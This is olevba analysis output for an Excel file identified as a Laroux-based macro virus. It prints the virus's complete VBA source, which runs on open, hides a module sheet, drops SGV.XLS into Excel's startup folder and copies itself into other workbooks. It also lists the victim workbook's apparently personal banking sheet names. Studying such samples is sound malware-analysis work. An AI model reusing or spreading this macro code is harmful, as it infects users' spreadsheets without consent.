olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-83a720aa539a3d97838e650f17856859bbfb5cd5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SGV.bas 
in file: Virus.MSExcel.Laroux-based-83a720aa539a3d97838e650f17856859bbfb5cd5 - OLE stream: '_VBA_PROJECT_CUR/VBA/SGV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





































Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "SGV.XLS")
    If m$ = "SGV.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("SGV").Visible = True
    Sheets("SGV").Select
    Sheets("SGV").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "SGV.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("SGV").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "SGV.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "SGV" Then
        Workbooks("SGV.XLS").Sheets("SGV").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("SGV").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "SGV.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  SG
' 0085     23 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Dollar Forecas
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tita's Renta
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  US Bank Account
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Stockholding
' 0085     22 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  Retirement Pa
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  $ Forecas
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  AssetVantag
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  $ HSB
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  HSBC 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  RCBC 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  RCBC-M $ 
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  RCBC-B2 $ T
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  RCBC T
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  RCBC-B1 $ T
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  RCBC-M PST
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  RCBC T
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

